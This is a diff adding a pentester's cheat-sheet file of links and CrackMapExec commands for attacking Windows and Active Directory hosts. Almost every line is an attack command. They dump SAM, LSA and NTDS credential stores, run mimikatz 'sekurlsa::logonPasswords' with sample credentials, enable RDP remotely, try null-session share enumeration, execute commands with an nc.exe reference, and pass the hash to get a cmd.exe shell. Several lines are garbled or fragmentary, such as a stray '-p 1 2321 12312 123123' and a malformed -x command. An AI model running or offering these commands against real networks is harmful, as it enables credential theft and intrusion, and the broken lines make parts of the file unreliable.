@@ -1,0 +1,61 @@
+https://mpgn.gitbook.io/crackmapexec/getting-started/using-kerberos
+https://stealthbits.com/blog/20170725lateral-movement-with-crackmapexec/
+https://github.com/Greenwolf/Spray
+https://www.infosecmatter.com/rce-on-windows-from-linux-part-2-crackmapexec/
+https://twitter.com/mpgn_x64/status/1357813192605519874?s=09
+https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference
+https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-meterpreter/
+https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/
+https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference
+https://github.com/byt3bl33d3r/CrackMapExec/wiki/Command-Execution
+
+-M gpp_password
+
+-id 1 --loggedon-users
+
+--rid-brute   
+
+--spider c\$ --pattern log  
+
+-M enum_dns
+
+--users
+
+--groups
+
+--pass-pol
+
+--session
+
+--disks
+
+--lsa
+
+--ntds drsuapi
+
+--ntds vss
+
+--sam
+
+--lsa
+
+--ntds
+
+-u admin -p 1 2321  12312 123123
+
+crackmapexec smb 192.168.0.111 -u 'Admior' -p 'Pua!!'  -M mimikatz -o COMMAND='sekurlsa::logonPasswords'
+
+cme smb ip -u '' -p '' -M rdp -o action=enable
+
+crackmapexec smb ip -u '' -p '' --shares
+
+crackmapexec smb ip -u '' -H ''
+
+				--ntds vss
+
+				-x '\net user \\smbdol nc.exe ' ejecucion de comandos
+
+                               --sam del directorio activo
+
+pth-wine U WORKGROUp/Admins%hash //ip cmd.exe
+
